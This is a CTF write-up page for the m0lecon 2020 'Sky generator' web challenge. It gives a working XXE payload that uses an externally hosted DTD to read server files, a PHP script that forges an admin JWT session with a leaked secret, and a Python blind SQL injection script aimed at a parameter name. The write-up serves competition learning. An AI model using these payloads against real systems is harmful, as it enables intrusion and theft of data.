@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>fibonhack | Sky generator</title>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+
+
+    <link rel="shortcut icon" href="/assets/images/favicon.jpg">
+    <script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167636907-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-167636907-1');
+    </script>
+
+</head>
+
+
+    <body>
+      <div class="container">
+
+        <header class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <img class="main-logo" src="/assets/images/fibonhack.png" alt="fibonhack">
+    </div>
+</header>
+
+<div class="row">
+  <div class="col-lg-8 col-lg-offset-2">
+    <div class="menu glow-yellow">
+      <ul>
+          <li><a href="/" >home</a></li>
+          <li><a href="/resources" >resources</a></li>
+          <li><a href="/posts" >posts</a></li>
+          <li><a href="/writeups" >writeups</a></li>
+        </ul>
+    </div>
+  </div>
+</div>
+
+
+
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2">
+            <main>
+            <div class="post">
+  <article class="post-content">
+  <div class="post">
+
+  <header class="post-header" style="padding-bottom: 0.8em;">
+    <p> 24 May 2020 </p>
+    <h1 style="margin: -0.02em auto;"> Sky generator - m0lecon 2020 Teaser - web</h1>
+    <div id="authors"> by
+    
+    
+      
+      <a href="/members/Maxpnl">Maxpnl</a>
+      
+    
+    
+    </div>
+  </header>
+
+  <article class="post-content">
+  <h3 id="initial-foothold">Initial foothold</h3>
+<p>The website allowed users to transform an xml to a png, containing a sort of constellation, I tried to read /etc/passwd through an xxe payload and it worked, I was a little bit stuck until another member of the team remembered me you can see directories contents, I then looked at /var/www and saw a few juicy php files, one of them was called config.php, the only problem was that a php file contains some characters (e.g. &lt;,  &gt;) which doesn’t behave well with xml, therefore I started looking for a way to bypass this limitation, one of them was using CDATA, using it leads the xml parser to avoid trying to interpret the readen file as an xml entity, it sort of sanitizes the readen file. In order to use it I had to create an external dtd file, and serve it using ngrok, the final payload looked something like</p>
+
+<p>(credits to https://dzone.com/articles/xml-external-entity-xxe-limitations)</p>
+
+<p>ngrok.dtd</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % file SYSTEM "file:///var/www/html/skygenerator/public/config.php"&gt;
+&lt;!ENTITY % start "&lt;![CDATA["&gt;
+&lt;!ENTITY % end "]]&gt;"&gt;
+&lt;!ENTITY % all "&lt;!ENTITY fileContents '%start;%file;%end;'&gt;"&gt; 
+</code></pre></div></div>
+
+<p>template.xml</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE data [
+ &lt;!ENTITY % dtd SYSTEM
+ "http://ngrokendpoint/ngrok.dtd"&gt;</span>
+ %dtd;
+ %all;
+]&gt;
+<span class="nt">&lt;sky&gt;</span>
+	<span class="nt">&lt;star</span> <span class="na">x=</span><span class="s">"10"</span> <span class="na">y=</span><span class="s">"10"</span><span class="nt">&gt;</span><span class="ni">&amp;fileContents;</span><span class="nt">&lt;/star&gt;</span>
+<span class="nt">&lt;/sky&gt;</span>
+</code></pre></div></div>
+
+<p>after that I was able to read the config.php file, as well as any other php file without parsing errors.</p>
+
+<h3 id="controlling-the-jwt-token">Controlling the jwt token</h3>
+<p>The config.php file had the secret key for the jwt token verification and it was using this plugin to replace the default session handling with jwt https://github.com/byjg/jwt-session.</p>
+
+<p>I took a look at the admin_dashboard.php as well, and it seemed like it was checking for the user role to decide whether a user can access it, this user role was stored inside the session, after seeing this the next steps are pretty straightforward, I installed that jwt session and created a little php script to set the user role inside the session to admin, using the same private key as the server. After that I had a jwt token that was valid for the challenge as well.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="k">include</span>  <span class="s2">"vendor/autoload.php"</span><span class="p">;</span>
+<span class="nv">$sessionConfig</span> <span class="o">=</span> <span class="p">(</span><span class="k">new</span> <span class="err">\</span><span class="nf">ByJG\Session\SessionConfig</span><span class="p">(</span><span class="s2">"skygenerator"</span><span class="p">))</span>
+<span class="o">-&gt;</span><span class="nf">withSecret</span><span class="p">(</span><span class="s2">"Vb8lckQX8LFPq45Exq5fy2TniLUplKGZXO2"</span><span class="p">)</span>
+<span class="o">-&gt;</span><span class="nf">withTimeoutMinutes</span><span class="p">(</span><span class="mi">60</span><span class="p">);</span>
+<span class="nv">$handler</span> <span class="o">=</span> <span class="k">new</span> <span class="err">\</span><span class="nf">ByJG\Session\JwtSession</span><span class="p">(</span><span class="nv">$sessionConfig</span><span class="p">);</span>
+<span class="nb">session_set_save_handler</span><span class="p">(</span><span class="nv">$handler</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"id"</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1846</span><span class="p">;</span>
+<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"role"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"admin"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="sql-injection-in-admin-panel">SQL Injection in admin panel</h3>
+<p>The admin dashboard had a sql injection problem, in addition to the user_id post param it added any extra post param inside the query, the problem is it was doing something like</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">query</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">SELECT ... user_id=:user_id</span><span class="dl">"</span><span class="p">;</span>
+<span class="nx">foreach</span> <span class="p">(</span><span class="nx">$_POST</span> <span class="k">as</span> <span class="nx">$param</span><span class="p">){</span>
+	<span class="nx">query</span> <span class="p">.</span><span class="o">=</span> <span class="dl">"</span><span class="s2"> AND $param=:param</span><span class="dl">"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The problem with this code is that $param is not sanitized and it can contain any sql statement, the only problem was that spaces didn’t behave well with the :param, the trick was to replace spaces with tabs (\t or %09 url encoded), then I just had to run a typical content-based blind sql injection on the name of the post parameter (not the value) and I got the flag</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="k">def</span> <span class="nf">tryshit</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">"</span><span class="se">\t</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="s">"https://challs.m0lecon.it:8000/admin_dashboard"</span><span class="p">,</span>
+        <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">"AUTH_BEARER_default"</span><span class="p">:</span> <span class="s">"generated jwt token"</span><span class="p">},</span>
+        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"user_id"</span><span class="p">:</span> <span class="n">my_user_id</span><span class="p">,</span> <span class="n">query</span><span class="p">:</span> <span class="mi">15</span><span class="p">})</span>
+    <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+
+
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">found</span> <span class="o">=</span> <span class="s">""</span>
+
+<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">found</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">100</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">found</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="s">"abcdef"</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">:</span>
+        <span class="n">dio</span> <span class="o">=</span> <span class="n">tryshit</span><span class="p">(</span><span class="s">"1=(SELECT 1 FROM flag WHERE hex(flag) LIKE '{}%') -- -"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">found</span><span class="o">+</span><span class="n">x</span><span class="p">))</span>
+        <span class="k">if</span> <span class="s">"filesize()"</span> <span class="ow">in</span> <span class="n">dio</span><span class="p">:</span>
+            <span class="n">found</span><span class="o">+=</span><span class="n">x</span>
+            <span class="k">break</span>
+</code></pre></div></div>
+
+  </article>
+</div>
+
+  </article>
+
+</div>
+
+            </main>
+          </div>
+        </div>
+
+        <div class="row">
+    <div class="col-lg-8 col-lg-offset-2">
+        <footer>
+            <div>
+                <div class="footer left column one-half">
+                    <small class="glow-yellow">
+                        Theme <a href="https://github.com/gildasio/clyell"> clyell</a> by <a
+                            href="https://github.com/gildasio/">gildasio</a> <br class="hidden visible-xs">powered by <a
+                            href="https://github.com/jekyll/jekyll">{{ jekyll }}</a>
+                    </small>
+                </div>
+
+                <div class="footer right column one-half">
+                    <section class="small-font">
+                        <a href="https://twitter.com/fibonhack"><span class="icon icon--twitter">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/>
+    </svg>
+</span>
+</a>
+                        <a href="https://github.com/fibonhack"><span class="icon icon--github">
+    <svg viewBox="0 0 16 16">
+        <path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/>
+    </svg>
+</span>
+</a>
+                    </section>
+                </div>
+            </div>
+        </footer>
+    </div>
+</div>
+
+      </div>
+    </body>
+</html>
